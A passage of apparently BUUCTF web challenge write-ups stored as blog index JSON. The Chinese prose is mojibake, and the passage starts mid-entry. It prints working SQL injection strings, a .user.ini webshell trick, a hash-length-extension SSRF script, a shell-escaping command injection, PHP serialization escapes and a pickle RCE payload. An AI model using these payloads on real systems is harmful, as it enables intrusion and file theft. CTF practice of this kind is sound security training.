çš„æ–‡ä»¶ç›®å½•æ˜¯å›ºå®šçš„ï¼ŒåŒç›®å½•ä¸‹åŸæœ¬å°±å­˜åœ¨ index.phpã€‚é‚£ä¹ˆå¯ä»¥å°è¯•ä¸Šä¼  .user.iniï¼Œä»¤ index.php ä¸­åŒ…å«ä¸Šä¼ çš„å›¾ç‰‡é©¬ã€‚ å¦‚ä¸‹ç¼–å†™ .user.iniï¼š GIF89a auto_prepend_file=1.jpg è¿™æ ·ä»¥åï¼Œå†è®¿é—®ä¸Šä¼ ç›®å½•ä¸‹çš„ index.php å³å¯ã€‚ ","date":"2019-11-29","objectID":"/buu-web/:8:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[ç½‘é¼æ¯ 2018]Fakebook é¦–å…ˆé€šè¿‡ robots.txt å‘ç° user.php.bakï¼š \u003c?php class UserInfo { public $name = \"\"; public $age = 0; public $blog = \"\"; public function __construct($name, $age, $blog) { $this-\u003ename = $name; $this-\u003eage = (int)$age; $this-\u003eblog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-\u003eget($this-\u003eblog); } public function isValidBlog () { $blog = $this-\u003eblog; return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog); } } å¯ä»¥å‘ç°è¾“å…¥çš„ blog å¤„å­˜åœ¨ SSRFï¼Œå¹¶ä¸”å¯¹ blog å­—ç¬¦ä¸²çš„æ¨¡å¼åšäº†é™åˆ¶ã€‚ å…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ï¼ŒæŸ¥çœ‹è´¦å·ä¿¡æ¯ä¼šè®¿é—®åˆ° view.php?no=1ï¼Œè¿™é‡Œå­˜åœ¨ SQL æ³¨å…¥ã€‚ no=1 and updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'),1)-- no=1 and updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name='users'),'~'),1)-- no=1 and updatexml(1,concat('~',(select data from users),'~'),1)-- å¯ä»¥å‘ç°å­˜åœ¨ no,username,passwd,data è¿™äº›å­—æ®µï¼Œå¹¶ä¸” data å­—æ®µå­˜æ”¾äº†åºåˆ—åŒ–çš„ User å¯¹è±¡ã€‚ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ª User ä½¿å¾—ä»–çš„ blog æŒ‡å‘ flag æ–‡ä»¶ã€‚è¿™æ ·å°±å¯ä»¥ç»•è¿‡ user.php çš„æ£€æŸ¥ã€‚ æ„é€ åºåˆ—åŒ–å¯¹è±¡ï¼š $a = new UserInfo('merc','10','file:///var/www/html/flag.php'); echo serialize($a); å¦å¤– union select è¢«è¿‡æ»¤ï¼Œéœ€è¦æ³¨é‡Šç»•è¿‡ã€‚ no=-1'union/**/select 1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:4:\"merc\";s:3:\"age\";i:10;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}'-- ","date":"2019-11-29","objectID":"/buu-web/:9:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[De1CTF 2019]SSRF Me iec from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding('latin1') app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = {} result['code'] = 500 if (self.checkSign()): if \"scan\" in self.action: tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w') resp = scan(self.param) if (resp ==\"Connection Timeout\"): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if \"read\" in self.action: f = open(\"./%s/result.txt\" % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = \"Action Error\" else: result['code'] = 500 result['msg'] = \"Sign Error\" return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False #generate Sign For Action Scan. @app.route(\"/geneSign\", methods=['GET', 'POST']) def geneSign(): param = urllib.unquote(request.args.get(\"param\",\"\")) action = \"scan\" return getSign(action, param) @app.route('/De1ta',methods=['GET','POST']) def challenge(): action = urllib.unquote(request.cookies.get(\"action\")) param = urllib.unquote(request.args.get(\"param\",\"\")) sign = urllib.unquote(request.cookies.get(\"sign\")) ip = request.remote_addr if(waf(param)): return \"No Hacker!!!!\" task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route('/') def index(): return open(\"code.txt\",\"r\").read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return \"Connection Timeout\" def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check=param.strip().lower() if check.startswith(\"gopher\") or check.startswith(\"file\"): return True else: return False if __name__ == '__main__': app.debug = False app.run(host='0.0.0.0') ä¸¤ç§æ“ä½œï¼šscan å†™å…¥ result.txtï¼Œread è¯»æ–‡ä»¶ã€‚ç”Ÿæˆç­¾åæ—¶å°† secret_key æ”¾åœ¨æœ€å‰é¢ï¼Œå› æ­¤å¯ä»¥é€šè¿‡å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»åœ¨æœ«å°¾æ·»åŠ ä¸€ä¸ª read æ“ä½œã€‚è¿™æ ·å°±å¯ä»¥å…ˆæŠŠ flag.txt å†™å…¥ result.txt å†è¯»å‡ºæ¥ã€‚ ä¸ºäº†è¯»åˆ° flag.txtï¼Œå¾ˆå®¹æ˜“æƒ³åˆ° file åè®®ï¼Œä½†æ˜¯åœ¨ waf ä¸­è¿‡æ»¤äº† file å’Œ gopher åè®®ã€‚è¿™é‡Œå¯ä»¥åˆ©ç”¨ urllib åº“ä¸­çš„ç‰¹æ®Šåè®® local-file æ¥è¯»æ–‡ä»¶ï¼Œé€ æˆ SSRFã€‚ import requests import urllib import hashpumpy base = 'http://0230c9c3-8270-4e74-9786-e6ab55d01eeb.node3.buuoj.cn/' url = 'local-file:flag.txt' r = requests.get(base +'geneSign?param='+ url) print(r.text) hashcode = hashpumpy.hashpump(r.text, url+'scan','read', 16) print(hashcode) cookies = { 'sign': hashcode[0], 'action': urllib.parse.quote(hashcode[1][len(url):]) } r = requests.get(base +'De1ta?param='+url, cookies=cookies) print(r.text) ","date":"2019-11-29","objectID":"/buu-web/:10:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[RoarCTF 2019]Easy Java å®¹æ˜“å‘ç°ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥ä¸‹è½½ WEB-INF/web.xmlï¼Œæ³¨æ„å¿…é¡»é€šè¿‡ POST æ–¹å¼ã€‚å¯ä»¥å‘ç°å­˜åœ¨ FlagControllerï¼Œç„¶åå»ä¸‹è½½ FlagControllerï¼š filename=WEB-INF/classes/com/wm/ctf/FlagController.class jd-gui åç¼–è¯‘å¯ä»¥å‘ç° flag çš„ base64 ç¼–ç ã€‚ ","date":"2019-11-29","objectID":"/buu-web/:11:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[0CTF 2016]piapiapia æ‰«ç›®å½•å¾— www.zipï¼Œå‘ç°æ­£å¸¸æ³¨å†Œç™»é™†åå¯ä»¥ä¿®æ”¹æ¡£æ¡ˆï¼ŒéšåæŸ¥çœ‹æ¡£æ¡ˆæ—¶å­˜åœ¨ååºåˆ—åŒ–æ“ä½œï¼Œè€Œå…¶ä¸­å›¾ç‰‡æ˜¯é€šè¿‡ file_get_contents è·å–çš„ï¼Œå¯ä»¥ç”¨æ¥è¯»å…³é”®æ–‡ä»¶ config.phpã€‚ $profile['phone'] = $_POST['phone']; $profile['email'] = $_POST['email']; $profile['nickname'] = $_POST['nickname']; $profile['photo'] = 'upload/' . md5($file['name']); $profile = unserialize($profile); $phone = $profile['phone']; $email = $profile['email']; $nickname = $profile['nickname']; $photo = base64_encode(file_get_contents($profile['photo'])); ä½†æ˜¯åœ¨æ›´æ–°æ¡£æ¡ˆæ—¶ï¼Œphoto å­—æ®µå‰ä¼šæ‹¼æ¥ä¸€ä¸ª upload/ å¯¼è‡´æ— æ³•è¯»åˆ° config.phpã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è€ƒè™‘å‘ nickname æ³¨å…¥åºåˆ—åŒ–å­—ç¬¦ä¸²çš„æœ«å°¾éƒ¨åˆ†ï¼Œä½¿å¾—ååºåˆ—åŒ–æ—¶å¿½ç•¥æ‰åŸæœ¬çš„ photo å­—æ®µã€‚ ä½†æ˜¯å¯¹äº nickname åˆå­˜åœ¨è¿‡æ»¤ï¼š if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) \u003e 10) die('Invalid nickname'); ä¸è¿‡ç»•è¿‡å¾ˆç®€å•ï¼Œæ•°ç»„ç»•è¿‡å³å¯ã€‚ æœ€åï¼Œä¸ºäº†æ³¨å…¥ photoï¼Œæˆ‘ä»¬éœ€è¦é¢å¤–æ·»åŠ ï¼š \";}s:5:\"photo\";s:10:\"config.php å…± 31 ä¸ªå­—ç¬¦ï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡»è®© nickname åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰ï¼Œé•¿åº¦å¢åŠ  31ï¼Œå¦åˆ™æˆ‘ä»¬æ–°å¢çš„éƒ¨åˆ†å°±ä¸ä¼šè¢«è¯»å…¥ã€‚å¹¸è¿çš„æ˜¯ï¼Œæˆ‘ä»¬æœ‰ filter å‡½æ•°ï¼š public function filter($string) { $escape = array('\\'','\\\\\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape,'_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe,'hacker', $string); } å¯ä»¥å‘ç°å®ƒä¼šå°† where æ›¿æ¢ä¸º hackerï¼Œä½¿å¾—å­—ç¬¦ä¸²é•¿åº¦ + 1ï¼Œé‚£ä¹ˆæˆ‘ä»¬é‡å¤è¯¥è¿‡ç¨‹ 31 æ¬¡å³å¯ã€‚ æœ€ç»ˆ payloadï¼š ------WebKitFormBoundary8V1KsQLRGLqfB6An Content-Disposition: form-data; name=\"phone\" 12345678901 ------WebKitFormBoundary8V1KsQLRGLqfB6An Content-Disposition: form-data; name=\"email\" admin@admin.com ------WebKitFormBoundary8V1KsQLRGLqfB6An Content-Disposition: form-data; name=\"nickname[]\" wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php ------WebKitFormBoundary8V1KsQLRGLqfB6An Content-Disposition: form-data; name=\"photo\"; filename=\"1.png\" Content-Type: image/png config.php ------WebKitFormBoundary8V1KsQLRGLqfB6An-- ","date":"2019-11-29","objectID":"/buu-web/:12:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[BUUCTF 2018]Online Tool å‚è€ƒæ–‡ç« ã€‚ ç®€å•æ¥è¯´ï¼Œescapeshellarg ä¼šå¯¹ä¼ å…¥å‚æ•°ä¸­çš„å•å¼•å·è¿›è¡Œè½¬ä¹‰ï¼Œç„¶åå°†å•å¼•å·ä¸¤è¾¹çš„å†…å®¹ç”¨ '' åŒ…èµ·æ¥ï¼›è€Œ escapeshellcmd ä¼šå¯¹è½¬ä¹‰ç¬¦ \\ ä»¥åŠä¸æˆå¯¹çš„å•å¼•å·è¿›è¡Œè½¬ä¹‰ã€‚é‚£ä¹ˆå…ˆ escapeshellarg å† escapeshellcmd å°±ä¼šé€ æˆå•å¼•å·é€ƒé€¸ã€‚ payloadï¼š ?host='\u003c?php echo phpinfo();?\u003e -oG 1.php ' ç»è¿‡ escapeshellargï¼š ?host=''\\' '\u003c?php echo phpinfo();?\u003e -oG 1.php'\\''' ç»è¿‡ escapeshellcmdï¼š ?host=''\\\\' '\\\u003c\\?php echo phpinfo\\(\\)\\;\\?\\\u003e -oG 1.php'\\\\''' ç„¶åè®¿é—®æ²™ç®±å³å¯ã€‚ ","date":"2019-11-29","objectID":"/buu-web/:13:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[SUCTF 2019]Pythonginx @app.route('/getUrl', methods=['GET', 'POST']) def getUrl(): url = request.args.get(\"url\") host = parse.urlparse(url).hostname if host == 'suctf.cc': return \"æˆ‘æ‰Œ your problem? 111\" parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return \"æˆ‘æ‰Œ your problem? 222\" + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #å»æ‰ url ä¸­çš„ç©ºæ ¼ finalUrl = urlunsplit(parts).split('')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return urllib.request.urlopen(finalUrl, timeout=2).read() else: return \"æˆ‘æ‰Œ your problem? 333\" é¢˜ç›®ä¸å…è®¸ä¸»æœºåä¸º suctf.ccï¼Œä½†æ˜¯ç»™äº†æç¤º h.encode('idna'.decode('utf-8))ï¼Œå¯ä»¥æŸ¥åˆ° urllib ç›¸å…³æ¼æ´ï¼Œåˆ©ç”¨ idna å­—ç¬¦ â„† å³å¯ç»•è¿‡ä¸»æœºåè¿‡æ»¤ï¼Œä½¿å¾—æœ€ç»ˆè§£ç å¾—åˆ°ä¸»æœºåæ˜¯ suctf.ccã€‚ ç„¶åï¼Œé¢˜ç›®è¿˜æç¤ºäº† nginxï¼Œå› æ­¤å¯ä»¥æƒ³åˆ°ç”¨ file åè®®è¯»å– nginx é…ç½®æ–‡ä»¶ï¼Œå¾—åˆ° flag ä½ç½®ï¼Œæ°å¥½ä¹Ÿä½äº /usr ç›®å½•ä¸‹ï¼Œå› æ­¤ç›´æ¥è¯»å³å¯ã€‚ ","date":"2019-11-29","objectID":"/buu-web/:14:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox å‚è€ƒ æ³¨å†Œåéšä¾¿ä¸Šä¼ ä¸ªæ–‡ä»¶ï¼Œç„¶åä¸‹è½½ï¼ŒæŠ“åŒ…å‘ç°å¯ä»¥æ”¹æˆåˆ«çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ /var/www/html/index.phpï¼š \u003c?php include \"class.php\"; $a = new FileList($_SESSION['sandbox']); $a-\u003eName(); $a-\u003eSize(); ?\u003e è¿™é‡Œåˆ›å»ºäº† FileList å¯¹è±¡ï¼Œè°ƒç”¨äº†ä¸¤ä¸ªæ–¹æ³•ã€‚ ç„¶åä¸‹è½½ class.phpï¼š \u003c?php error_reporting(0); $dbaddr = \"127.0.0.1\"; $dbuser = \"root\"; $dbpass = \"root\"; $dbname = \"dropbox\"; $db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname); class User { public $db; public function __construct() { global $db; $this-\u003edb = $db; } public function user_exist($username) { $stmt = $this-\u003edb-\u003eprepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\"); $stmt-\u003ebind_param(\"s\", $username); $stmt-\u003eexecute(); $stmt-\u003estore_result(); $count = $stmt-\u003enum_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this-\u003euser_exist($username)) { return false; } $password = sha1($password .\"SiAchGHmFx\"); $stmt = $this-\u003edb-\u003eprepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\"); $stmt-\u003ebind_param(\"ss\", $username, $password); $stmt-\u003eexecute(); return true; } public function verify_user($username, $password) { if (!$this-\u003euser_exist($username)) { return false; } $password = sha1($password .\"SiAchGHmFx\"); $stmt = $this-\u003edb-\u003eprepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\"); $stmt-\u003ebind_param(\"s\", $username); $stmt-\u003eexecute(); $stmt-\u003ebind_result($expect); $stmt-\u003efetch(); if (isset($expect) \u0026\u0026 $expect === $password) { return true; } return false; } public function __destruct() { $this-\u003edb-\u003eclose(); } } class FileList { private $files; private $results; private $funcs; public function __construct($path) { $this-\u003efiles = array(); $this-\u003eresults = array(); $this-\u003efuncs = array(); $filenames = scandir($path); $key = array_search(\".\", $filenames); unset($filenames[$key]); $key = array_search(\"..\", $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file-\u003eopen($path . $filename); array_push($this-\u003efiles, $file); $this-\u003eresults[$file-\u003ename()] = array(); } } public function __call($func, $args) { array_push($this-\u003efuncs, $func); foreach ($this-\u003efiles as $file) { $this-\u003eresults[$file-\u003ename()][$func] = $file-\u003e$func(); } } public function __destruct() { $table = '\u003cdiv id=\"container\"class=\"container\"\u003e\u003cdiv class=\"table-responsive\"\u003e\u003ctable id=\"table\"class=\"table table-bordered table-hover sm-font\"\u003e'; $table .= '\u003cthead\u003e\u003ctr\u003e'; foreach ($this-\u003efuncs as $func) { $table .= '\u003cth scope=\"col\"class=\"text-center\"\u003e' . htmlentities($func) . '\u003c/th\u003e'; } $table .= '\u003cth scope=\"col\"class=\"text-center\"\u003eOpt\u003c/th\u003e'; $table .= '\u003c/thead\u003e\u003ctbody\u003e'; foreach ($this-\u003eresults as $filename =\u003e $result) { $table .= '\u003ctr\u003e'; foreach ($result as $func =\u003e $value) { $table .= '\u003ctd class=\"text-center\"\u003e' . htmlentities($value) . '\u003c/td\u003e'; } $table .= '\u003ctd class=\"text-center\"filename=\"'. htmlentities($filename) . '\"\u003e\u003ca href=\"#\"class=\"download\"\u003eæ¶“å¬­æµ‡ \u003c/a\u003e / \u003ca href=\"#\"class=\"delete\"\u003e é’çŠ»æ«\u003c/a\u003e\u003c/td\u003e'; $table .= '\u003c/tr\u003e'; } echo $table; } } class File { public $filename; public function open($filename) { $this-\u003efilename = $filename; if (file_exists($filename) \u0026\u0026 !is_dir($filename)) { return true; } else { return false; } } public function name() { return basename($this-\u003efilename); } public function size() { $size = filesize($this-\u003efilename); $units = array(' B', 'KB', 'MB', 'GB', 'TB'); for ($i = 0; $size\u003e= 1024 \u0026\u0026 $i \u003c4; $i++) $size /= 1024; return round($size, 2).$units[$i]; } public function detele() { unlink($this-\u003efilename); } public function close() { return file_get_contents($this-\u003efilename); } } ?\u003e æˆ‘ä»¬æ³¨æ„åˆ°ï¼ŒFileList å¹¶æ²¡æœ‰åˆšæ‰è°ƒç”¨çš„ä¸¤ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯å´æœ‰ __call é­”æœ¯æ–¹æ³•ï¼Œå› æ­¤ä¼šå»è°ƒç”¨ File çš„ name å’Œ size æ–¹æ³•ã€‚è¿™é‡Œæç¤ºæˆ‘ä»¬ä½¿ç”¨ __call è°ƒç”¨ File çš„å…¶ä»–æ–¹æ³•æ¥è¿›è¡Œæ¼æ´åˆ©ç”¨ï¼Œä¾‹å¦‚ close å°±æ˜¯ä¸é”™çš„é€‰æ‹©ã€‚ è€Œåœ¨ä¸‹è½½å’Œåˆ é™¤æ—¶ï¼Œä¼šåˆ†åˆ«ä½¿ç”¨ download.php å’Œ delete.phpï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶ä¹Ÿä¸‹è½½ä¸‹æ¥ï¼š \u003c?php session_start(); if (!isset($_SESSION['login'])) { header(\"Location: login.php\"); die(); } if (!isset($_POST['filename'])) { die(); } include \"class.php\"; ini_set(\"open_basedir\", getcwd() .\":/etc:/tmp\"); chdir($_SESSION['sandbox']); $","date":"2019-11-29","objectID":"/buu-web/:15:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[ASIS 2019]Unicorn shop æœ¬é¢˜éœ€è¦èŠ±è´¹ 1337 è´­ä¹°è¶…çº§ç‹¬è§’å…½ï¼Œä½†è¾“å…¥çš„ä»·æ ¼åªèƒ½æ˜¯ä¸€ä¸ªå­—ç¬¦ã€‚æŸ¥çœ‹æºä»£ç å‘ç°æç¤ºå’Œ UTF8 ç›¸å…³ï¼Œå› æ­¤å»æŸ¥è¯¢ Unicode ä¸­æ•°å€¼å¤§äº 1337 çš„å­—ç¬¦çš„ UTF8 ç¼–ç ï¼Œä¸¾ä¸ªä¾‹å­ï¼š id=4\u0026price=%e1%8d%bc è¿™ä¸ªå­—ç¬¦ä»£è¡¨ä¸€ä¸‡ï¼Œå› æ­¤å¯ä»¥è´­ä¹°ã€‚æŸ¥è¯¢ç½‘ç«™ ","date":"2019-11-29","objectID":"/buu-web/:16:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun é¦–å…ˆéœ€è¦æ‰¾åˆ° lv6ï¼Œé¡µæ•°å¾ˆå¤šï¼Œå†™è„šæœ¬è·‘ä¸€ä¸‹ï¼š import requests base = 'http://92a45198-65ac-407a-afbb-530a083474e9.node3.buuoj.cn/shop?page=' for i in range(1,2000): url = base + str(i) r = requests.get(url) if 'lv6.png' in r.text: print(i) break å‘ç°åœ¨ 181 é¡µï¼Œç‚¹å‡»è´­ä¹°å‘ç°é’±ä¸å¤Ÿä½†æ˜¯å­˜åœ¨æŠ˜æ‰£ï¼Œå› æ­¤æŠ“åŒ…ä¿®æ”¹æŠ˜æ‰£ä¸ºéå¸¸å°çš„æ•°å­—ï¼Œè¿›å…¥ b1g_m4mber é¡µé¢ï¼Œæç¤ºè¯´åªæœ‰ admin å¯ä»¥è®¿é—®ã€‚ æŠ“åŒ…å‘ç°å­˜åœ¨ä¸€ä¸ªé•¿åº¦çœ‹èµ·æ¥å¾ˆçŸ­çš„ jwtï¼Œæ‰”åˆ° c_jwt_cracker é‡Œè·‘å‡ºå¯†é’¥ 1Kunï¼Œä»è€Œå¯ä»¥åˆ° jwt.io ä¸Šä¼ªé€  admin èº«ä»½ã€‚ éšåå¤šå‡ºäº†ä¸€é”®æˆä¸ºå¤§ä¼šå‘˜çš„åŠŸèƒ½ï¼Œä½†æ˜¯ç‚¹å‡»æ²¡æœ‰ç”¨ï¼ŒæŸ¥çœ‹æºä»£ç å¾—åˆ°æºç ã€‚ç»è¿‡ä»£ç å®¡è®¡åï¼Œå‘ç°åœ¨ Admin.py å¤„å­˜åœ¨ pickle ååºåˆ—åŒ–ï¼š @tornado.web.authenticated def post(self, *args, **kwargs): try: become = self.get_argument('become') p = pickle.loads(urllib.unquote(become)) return self.render('form.html', res=p, member=1) except: return self.render('form.html', res='This is Black Technology!', member=0) æˆ‘ä»¬å¯ä»¥å€ŸåŠ©å…¶é­”æœ¯æ–¹æ³• __reduce__ æ¥æ‰§è¡Œ python ä»£ç ã€‚å‚è€ƒ æ³¨æ„ pickle ä¸èƒ½è·¨ python ç‰ˆæœ¬ï¼Œè¿™é‡Œé‡‡ç”¨ python2ï¼š import pickle import urllib class payload(object): def __reduce__(self): return (eval, ('open(\"/flag.txt\",\"r\").read()',)) p = pickle.dumps(payload()) print urllib.quote(p) å³å¯ç”Ÿæˆ URL ç¼–ç çš„åºåˆ—åŒ–æ•°æ®ï¼Œå¡«å…¥ become å­—æ®µå³å¯ã€‚ c__builtin__%0Aeval%0Ap0%0A%28S%27open%28%22/flag.txt%22%2C%22r%22%29.read%28%29%27%0Ap1%0Atp2%0ARp3%0A. ","date":"2019-11-29","objectID":"/buu-web/:17:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[GYCTF2020] Blacklist å­˜åœ¨è¿‡æ»¤è¯­å¥ return preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject);ï¼Œæ— æ³• selectï¼Œå¯ä»¥è€ƒè™‘å †å æ³¨å…¥ï¼š -1';show tables;# -1';show columns from FlagHere;# å¯ä»¥å¾—åˆ°åˆ—åä¸º flagï¼Œç„¶åé€šè¿‡ HANDLER è¯­æ³•è¯»å– flagã€‚ -1';handler FlagHere open; handler FlagHere read first; handler close;# ","date":"2019-11-29","objectID":"/buu-web/:18:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[å®‰æ´µæ¯ 2019]easy_serialize_php \u003c?php $function = @$_GET['f']; function filter($img){ $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img); } if($_SESSION){ unset($_SESSION); } $_SESSION[\"user\"] = 'guest'; $_SESSION['function'] = $function; extract($_POST); if(!$function){ echo '\u003ca href=\"index.php?f=highlight_file\"\u003esource_code\u003c/a\u003e'; } if(!$_GET['img_path']){ $_SESSION['img'] = base64_encode('guest_img.png'); }else{ $_SESSION['img'] = sha1(base64_encode($_GET['img_path'])); } $serialize_info = filter(serialize($_SESSION)); if($function =='highlight_file'){ highlight_file('index.php'); }else if($function =='phpinfo'){ eval('phpinfo();'); //maybe you can find something in here! }else if($function =='show_image'){ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo['img'])); } æœ¬é¢˜çš„å…³é”®é—®é¢˜åœ¨äºï¼Œå¯¹äºåºåˆ—åŒ–åçš„æ•°æ®è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´ååºåˆ—åŒ–æ—¶å‡ºé”™ã€‚ é¦–å…ˆå­˜åœ¨æ˜æ˜¾çš„å˜é‡è¦†ç›–ï¼Œæ˜¾ç„¶å¯ä»¥è¦†ç›–çš„å˜é‡åªæœ‰ $_SESSIONï¼Œéšåæ³¨æ„åˆ°å¦‚æœæŒ‡å®š img_path é‚£ä¹ˆ $SESSION[img] å°†è¢«å“ˆå¸Œï¼Œå˜å¾—ä¸å¯æ§ã€‚è€Œä¸‹æ–¹ file_get_contents åˆæé†’æˆ‘ä»¬å¿…é¡»æ§åˆ¶ img å­—æ®µï¼Œå› æ­¤éœ€è¦é€šè¿‡ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸æ¥å®ç°ã€‚ å…ˆé€šè¿‡æç¤ºåœ¨ phpinfo ä¸­å‘ç° d0g3_f1ag.php æ–‡ä»¶ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬è¦æ”¾è¿› img çš„æ–‡ä»¶äº†ã€‚éšååˆ©ç”¨ filter å‡½æ•°çš„è¿‡æ»¤åŠŸèƒ½åæ‰ 24 ä¸ªå­—ç¬¦ï¼Œä½¿å¾—ååºåˆ—åŒ–æ—¶å¤šè¯»å…¥å 24 å­—ç¬¦å¹¶èˆå¼ƒåé¢çš„æ‰€æœ‰å†…å®¹ã€‚å…·ä½“åœ°è¯´ï¼Œæ„é€ ï¼š _SESSION[user]=flagflagflagflagflagflag\u0026_SESSION[function]=a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:2:\"dd\";s:1:\"a\";} é‚£ä¹ˆåºåˆ—åŒ–åæ•°æ®å˜ä¸ºï¼š a:3:{s:4:\"user\";s:24:\"flagflagflagflagflagflag\";s:8:\"function\";s:59:\"a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:2:\"dd\";s:1:\"a\";}\";s:3:\"img\";s:28:\"L3VwbG9hZC9ndWVzdF9pbWcuanBn\";} å†ç»è¿‡ filterï¼Œå˜æˆï¼š a:3:{s:4:\"user\";s:24:\"\";s:8:\"function\";s:59:\"a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:2:\"dd\";s:1:\"a\";}\";s:3:\"img\";s:28:\"L3VwbG9hZC9ndWVzdF9pbWcuanBn\";} 